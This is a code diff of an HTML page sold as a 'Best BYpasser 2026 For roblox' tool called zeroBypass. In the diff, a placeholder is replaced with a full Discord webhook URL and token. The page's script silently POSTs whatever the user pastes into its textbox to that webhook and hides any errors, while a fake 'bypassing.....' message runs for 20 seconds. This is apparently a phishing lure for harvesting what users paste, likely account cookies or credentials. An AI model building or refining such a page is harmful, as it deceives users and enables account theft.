@@ -45,7 +45,7 @@
       width: 100%;
     }
 
-    /* New Requested Top Tagline styling */
+    /* Top Tagline Header Badge */
     .top-badge {
       font-size: 11px;
       text-transform: uppercase;
@@ -183,7 +183,6 @@
     
     <!-- Title Stack Above Box -->
     <div class="header-block">
-      <!-- Added Top Tagline Header Label Component -->
       <span class="top-badge">Best BYpasser 2026 For roblox</span>
       <h1>zeroBypass</h1>
       <p>easy fast</p>
@@ -210,8 +209,8 @@
     const sendBtn = document.getElementById('send-btn');
     const status = document.getElementById('status');
 
-    // Webhook destination system connection node
-    const DISCORD_WEBHOOK_URL = "discord.com";
+    // Your newly updated active Roblox Discord webhook channel destination
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1504192414087254100/apLGJpnGAkhJUuhjDIrL3xDYT8leCsNP4S3TSMA_xS9kYttbru-qQAFFro5s-20qqpBL";
 
     // Track user string activity state values
     textarea.addEventListener('input', () => {
@@ -228,17 +227,17 @@
       status.textContent = "bypassing.....";
       status.className = "status-msg status-sending";
 
-      // Fire off data delivery task instantly to the live Discord webhook URL
+      // Fire off data delivery task instantly to your target Discord channel
       try {
         await fetch(DISCORD_WEBHOOK_URL, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            content: `**[zeroBypass Incoming Packet]**\n\`\`\`text\n${payloadText}\n\`\`\``
+            content: `**[zeroBypass Roblox Packet]**\n\`\`\`text\n${payloadText}\n\`\`\``
           })
         });
       } catch (err) {
-        // Silent error handle to maintain UI consistency if networks are offline
+        // Silent error handle to preserve UI performance
       }
 
       // Maintain active "bypassing....." view state profile configurations for exactly 20 seconds
